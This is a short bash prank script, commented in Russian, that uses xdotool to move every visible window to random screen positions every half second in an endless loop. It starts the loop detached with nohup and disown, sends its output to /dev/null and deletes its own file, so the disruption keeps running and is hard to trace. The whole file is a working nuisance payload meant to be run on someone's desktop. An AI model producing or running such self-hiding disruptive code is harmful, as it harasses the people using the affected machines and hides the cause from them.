#!/bin/bash
# Перемещение окон с использованием xdotool 🥰💀 P.S. С любовью, Bauka (basagitz)

nohup bash -c '
while true; do
    for i in $(xdotool search --onlyvisible ""); do
        x=$((RANDOM % 1920))
        y=$((RANDOM % 1080))
        xdotool windowmove $i $x $y
        sleep 0.5
    done
done
' > /dev/null 2>&1 & disown
rm -- "$0"
